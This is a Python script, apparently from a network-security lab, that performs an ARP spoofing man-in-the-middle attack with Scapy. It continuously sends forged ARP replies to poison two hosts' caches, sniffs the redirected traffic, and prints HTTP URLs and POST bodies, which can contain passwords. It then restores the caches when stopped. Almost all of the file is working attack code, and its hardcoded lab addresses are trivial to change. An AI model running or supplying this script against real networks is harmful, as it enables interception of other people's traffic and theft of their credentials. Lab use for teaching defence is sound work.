"""
Lab - ARP Spoof Attack
    > Static attack code

# To enable ip forwarding on the host for further tests:
# echo 1 > /proc/sys/net/ipv4/ip_forward

(CC BY-SA 4.0) github.com/moospit
"""

from scapy.all import ARP, Ether, sendp, AsyncSniffer, Packet, Raw
from scapy.layers.http import HTTPRequest
import logging
import time

IFACE = 'eth0'  # the inferface we want to use

# supress scapy import warnings
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)


def process_packet(pkt: Packet) -> None:
    """ Process the sniffed packets """
    if pkt.haslayer(HTTPRequest):
        req = pkt[HTTPRequest]
        url = req.Host.decode()
        path = req.Path.decode()
        method = req.Method.decode()

        print(f'HTTP: {url}{path} -> {method}')
        if method == 'POST' and pkt.haslayer(Raw):
            print(f'Data: {pkt[Raw].load}')


def main() -> None:
    """ Do the attack """
    sniff = AsyncSniffer(iface='eth0', prn=process_packet,
                         store=False)

    try:
        sniff.start()
        print('[>] Starting poisoning')
        while True:
            sendp(Ether(dst='00:00:00:00:00:01')/ARP(
                op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
                psrc='10.10.0.102', hwsrc='00:00:00:00:00:03'),
                verbose=False, iface=IFACE)
            sendp(Ether(dst='00:00:00:00:00:02')/ARP(
                op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
                psrc='10.10.0.101', hwsrc='00:00:00:00:00:03'),
                verbose=False, iface=IFACE)
            time.sleep(1)  # don't flood the network
    except KeyboardInterrupt:
        print('\n[>] Got keyboard interrupt')
        sniff.stop()

    # clean up victim's arp caches
    print('[>] Cleaning up')
    sendp(Ether(dst='00:00:00:00:00:01')/ARP(
        op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
        psrc='10.10.0.102', hwsrc='00:00:00:00:00:02'),
        verbose=False, iface=IFACE)
    sendp(Ether(dst='00:00:00:00:00:02')/ARP(
        op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
        psrc='10.10.0.101', hwsrc='00:00:00:00:00:01'),
        verbose=False, iface=IFACE)


if __name__ == '__main__':
    main()
